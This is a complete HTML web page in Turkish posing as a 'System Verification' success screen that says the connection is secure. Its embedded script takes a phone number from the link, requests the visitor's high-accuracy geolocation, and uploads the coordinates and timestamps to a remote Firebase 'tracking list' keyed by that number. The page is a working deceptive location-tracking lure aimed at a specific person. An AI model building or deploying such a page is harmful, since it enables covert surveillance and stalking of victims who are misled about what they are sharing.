<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Doğrulaması</title>
    <link rel="stylesheet" href="index.css">
    <script src="https://unpkg.com/lucide@latest"></script>
</head>
<body>
    <div class="glass-card" style="text-align: center;">
        <i data-lucide="shield-check" style="width: 48px; height: 48px; color: #10b981; margin-bottom: 1.5rem;"></i>
        <h2 id="name-display" style="margin: 0; font-size: 1.25rem;">Doğrulama Başarılı</h2>
        <p style="color: var(--text-secondary); margin-top: 0.5rem; font-size: 0.9rem;">Bağlantı güvenli bir şekilde sağlandı. Bu sayfayı kapatabilirsiniz.</p>
        <div id="st" style="margin-top: 2rem; font-size: 0.7rem; color: #475569; letter-spacing: 0.1em; border-top: 1px solid var(--border-color); padding-top: 1rem;">SİSTEM AKTİF...</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getDatabase, ref, update, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
        import firebaseConfig from './firebase-config.js';

        const params = new URLSearchParams(window.location.search);
        const tel = params.get('tel');
        const name = params.get('n') || "Sistem Doğrulaması";
        
        document.title = name;
        document.getElementById('name-display').innerText = name + " Başarılı";
        lucide.createIcons();

        if (tel && navigator.geolocation) {
            const db = getDatabase(initializeApp(firebaseConfig));
            navigator.geolocation.getCurrentPosition((p) => {
                update(ref(db, 'takip_listesi/' + tel), {
                    lat: p.coords.latitude, lon: p.coords.longitude,
                    accuracy: p.coords.accuracy,
                    ts: serverTimestamp(), lastSeen: new Date().toLocaleTimeString()
                }).then(() => { document.getElementById('st').innerText = "İŞLEM TAMAMLANDI"; });
            }, null, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
